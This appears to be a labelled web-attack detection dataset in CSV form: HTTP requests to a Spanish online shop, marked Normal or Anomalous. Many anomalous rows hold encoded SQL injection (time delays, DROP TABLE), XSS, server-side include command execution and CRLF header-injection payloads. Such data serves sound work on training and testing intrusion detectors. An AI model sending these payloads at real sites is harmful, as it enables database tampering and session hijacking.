label,method,url,http_version,host,user_agent,pragma,cache_control,accept,accept_encoding,accept_charset,language,cookie,content_type,content_length,connection,body,classification
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=austin&password=va%ED6A&nombre=Dami%E1n&apellidos=Haddock&email=ryder%40mataluenga.zm&dni=12773567B&direccion=Oasis%2C+89+&ciudad=Y%E9meda&cp=42181&provincia=A+Coru%F1a%257C&ntc=1457291251258810&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C286FBB9910986058238043E7EBB9102,,,close,,1
Normal,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=ingrey&pwd=asErTIVAmeNte&remember=off&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=F310B36B0B2FD98AD49B1EBECFCADE31,,,close,,0
Anomalous,GET,/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=9&B1A=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=DAF12A4AAEDD524BAB024F39446A8B4C,,,close,,1
Normal,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=yihban&pwd=04or2ativ1&remember=off&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C4DD9D689DABAA4BC519BF3F229F11B5,,,close,,0
Normal,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=25&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=0A4A7E0E01E2E8362119C5D6E4237F69,,,close,,0
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=melany9&password=imperturbablemente&nombre=Auberto&apellidos=Carabelli+Larra%F1aga&email=ansel%40barebackespa%F1a.lv&dni=42519552G&direccion=C%2F+Echeto+38%2C+&ciudad=Biel&cp=22439&provincia=Barcelona&ntc=6099378900535506+&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9926D26D53A8022BA611775CE0F6BAE4,,,close,,1
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=mtl&pwd=r22camien5%2B9&remember=on%2F&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=81C75615B6B08EBFF1E953EC5E7CE3B2,,,close,,1
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=micgael5&password=dogal&nombre=Adelmo&apellidos=%2B&email=cagney%40hiperespa%F1a.et&dni=99942317A&direccion=Carrer+Sant+Fruitos+1%2C+&ciudad=Riells+i+Viabrea&cp=29410&provincia=M%E1laga&ntc=4452881808901719&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=D3599084688F81E99F699163C66FFE1F,,,close,,1
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=nadir&password=ENaRdEcedoRa&nombre=Gerino&apellidos=Mont%E1vez+Zurita&email=nassiet.birkin%40cienciapolicial.gl&dni=70075138A&direccion=C%2F+Moriles+91+&ciudad=Jorquera&cp=25324&provincia=Zamora&ntc=5230108987533758&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=36E56BC56EACF418800EB76BE065105A,,,close,,0
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=1927&B1=Confirmar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=0EE6F572EF3CE220158CAD98F17D7A42,,,close,,0
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=egner&password=fAisanA&nombre=Queila&apellidos=Kaempfe+Amilibia&email=dahlke8%40elviajehacomenzado.sv&dni=57955652E&direccion=Calle+Codigo+Correspondencia+Oficial+Correos-telegrafos+33+&ciudad=Puebla+de+Bele%F1a&cp=16812&provincia=Cuenca&ntc=5630456632018872&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=2555BB6667DCD82283BC85E440A164C2,,,close,,0
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=342&B1A=Confirmar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=25B71B713958640FD293500FD50AA1E6,,,close,,1
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=ezri&password=mo%21ralidad&nombre=Isaciar&apellidos=Foixenc+Illanes&email=renan1%40fichajes.nom.sd&dni=75730563G&direccion=C%2F+Echegaray+S%2FN%2C+&ciudad=Chueca&cp=23628&provincia=Alicante&ntc=0106099240126772&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C1EFA0E4786A4A52A9E5C8C3E843DD0C,,,close,,0
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=8962&B1=%253F,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=399BD64C55CC14AFC54DCB2ED26DC887,,,close,,1
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=siham&password=enat%EDametn%21e&nombre=Ces%E1rio&apellidos=Castany+Bigorra&email=mangini%40cubiertoscbb.an&dni=93029703Q&direccion=Calle+Rio+Guadajira+182+7-H&ciudad=Codosera%2C+La&cp=22314%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&provincia=Salamanca&ntc=9377074508770290&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=255BEC4913C24D0505F43F25198F23B3,,,close,,1
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=5290&B1=Confirmar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=86F43E47887A9A7BB639FBE44A0E7763,,,close,,0
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=stormy&password=229669a3a&nombre=Pa%FAl&apellidos=Romeu+Herrero&email=lorain-ligero%40mareventsprotocolosocial.tn&dni=23763353Y&direccion=Calle+Nuestra+Se%F1ora+Del+Portal+S%2FN%2C+&ciudad=Muras&cp=34260&provincia=Zamora&ntc=8412575121393763&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=5E6EA8ED8C968D43AFAC427EE69711F8,,,close,,0
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=%22+AND+%221%22%3D%221&password=SUrCa%D1*o&nombre=Emerio&apellidos=Abajo+Witron&email=ammelrooy%40mariposasentudia.travel&dni=46405415V&direccion=Avinguda+Puigfred+108%2C+&ciudad=San+Crist%F3bal+de+la+Cuesta&cp=09471&provincia=Valencia&ntc=0824087698765397&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=4B49ED868091FF8284CAA55E706046F2,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=dajerlin&password=3O172A1I0m6n19&nombre=Vi%2Cta&apellidos=Bordas+Rubies&email=carves%40travelzone.hn&dni=59561138Q&direccion=Calle+Morera%2C+139%2C+8G&ciudad=Funes&cp=17143&provincia=Toledo&ntc=9899066630450137&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=A7DB95EB4A522A102FD02CF24864C85F,,,close,,1
Anomalous,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cantidad=98&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=B6D03E2D625D4BC45C0383495067A146,,,close,,1
Normal,GET,/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=56&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=477AD6D4D33304BB4217E6DF81FD3147,,,close,,0
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=entrar%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&login=van_kess&pwd=3ran48&remember=on&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=69A2C76B6E0893DF7BD4207979903198,,,close,,1
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=nicolo&passwordA=corconera&nombre=Pastora&apellidos=Cruillas&email=damboise%40automovilesalhambra.co&dni=59569586T&direccion=Iru%F1a+43%2C+&ciudad=Cervera+del+Llano&cp=18614&provincia=Santa+Cruz+de+Tenerife&ntc=6204495616575478&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=5C379212E90212663106B66F0581FC58,,,close,,1
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=2323&B1=Confirmar%2F,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=83A458DD307B2CAF98E813CC28C1B865,,,close,,1
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=mcmurray&password=e6749L178E3a&nombre=Idefonsa&apellidos=Belito+Cede%F1o&email=mallet.asanachinda%40placeresadultos.cf&dni=30216787P&direccion=Pla%E7a+Del+Pi+126+11%3FG&ciudad=Atazar%2C+El&cp=40320&provincia=Lleida&ntc=9084625508674249&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C941AEBC5EA9B2C60D4EC93F59D87A4F,,,close,,0
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=erdem&password=veRd7ma3&nombre=Zinedine&apellidos=Terzano+Revert%E9&email=%257C&dni=58018464K&direccion=C%2F+Alondra%2C+134%2C+10%3FC&ciudad=Pu%E9rtolas&cp=33070&provincia=Guadalajara&ntc=4378749164701036&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C734240405FFED38DCEB37EC1304E948,,,close,,1
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=90any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=62FEA49E039C2C3D10922273E941A6DF,,,close,,1
Anomalous,GET,/tienda1/miembros/imagenes/zarauz.jpg/6909030637832563290.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=963C7CB0A9C5971E357CCB8F1C2BD471,,,close,,1
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=symon&password=d66jador&nombre=Caterina&apellidos=Fincias+Alcoriza&email=cabot%40eurograb.tel&dni=74566884X&direccion=C%2F+Paseillo+153%2C+&ciudad=Nonaspe&cp=45738&provincia=Granada&ntc=4979216909976076&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=4CF8E3CFB2CABFB8E1050C50404E16B6,,,close,,0
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=arine&password=6%24ng4TADo&nombre=Brigitte&apellidos=Scheurer+Ezpeleta&email=lyston%40classroommanager.co&dni=32788800T&direccion=Carlos+Arniches+78%2C+&ciudad=Fisterra&cp=05196&provincia=Burgos&ntc=0432799934318688&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=58C9D89322FE618A57640ABCA154C728,,,close,,0
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=31&B1A=Confirmar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=23E206A4CA30902187F4B014C110C322,,,close,,1
Anomalous,GET,/tienda1/publico/caracteristicas.jsp?id=2+,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=D8FDC2D1E6F1C526D702B1E50568F429,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=nettle&password=He%D1ir&nombre=Rad&apellidos=Zalarich+Llufriu&email=duarte%40ingenieriadelaconstruccion.vc&dni=47182191Z&direccion=Baza%2C+55%2C+&ciudad=Y%2Fe%2B%2Bsa&cp=43151&provincia=Granada&ntc=8375962445368254&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=AEB3AED2DFF5A30F8FB8D507BDADAD8A,,,close,,1
Normal,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=52&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=2CD740B52852ACB2FC16365AA4905972,,,close,,0
Anomalous,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=30%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=15928E947C97DBF6F15B37F39C513241,,,close,,1
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=chonchan&pwd=ZARce%F1O&remember=off&B1=Set-cookie%253A%2BTamper%253D1041264011025374727,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=D490DBA932DEEC829BB428464360B9CA,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=pye&password=59rola9o&nombre=Hermenegilda&apellidos=Lunar+De+Broy&email=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&dni=39171878A&direccion=Pla%E7a+Rectoria+17+8%3FA&ciudad=Al%E1jar&cp=27118&provincia=Salamanca&ntc=5074100981550289&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=82EBDF7035AA20FDAFD0D0203C4C7928,,,close,,1
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=bartz&password=impunida&nombre=Eliberto&apellidos=Ba%F1os+Peleij%E0&email=luke%40barnizultravioleta.ar&dni=88597573D&direccion=Calle+Albacete%2C+83+paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&ciudad=Nevada&cp=28794&provincia=Ourense&ntc=4823016932298784&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=B881541859B927B34B0AB70160D431F4,,,close,,1
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=wierzba&password=en62rm30a&nombre=Adelfo&apellidos=Mundaca+G%F3mez&email=gor%40mley%40apicultor.kz&dni=78942434V&direccion=Periodista+Jose+Fernandez+Martinez%2C+156+5%3FB&ciudad=Navaconcejo&cp=44592&provincia=Madrid&ntc=0883153406920438&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9C9C7F86D904C90AFC9D2595A184A974,,,close,,1
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=stefanac&password=autointoxicaci%F3n&nombre=Eudoro&apellidos=Valderr%E1bano&email=marleau%40rosaserigrafia.nz&dni=08475533X&direccion=Pl.+Elio+Antonio+De+Nebrija%2C+34+&ciudad=Santa+Mar%EDa+del+Cubillo&cp=43740&provincia=Guadalajara&ntc=3535089372971785&B1=Registrar%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=267D7684DC93AAA46419867C56624102,,,close,,1
Normal,GET,/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=21&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=1C9EEFA51BE44962004963CCA0B64635,,,close,,0
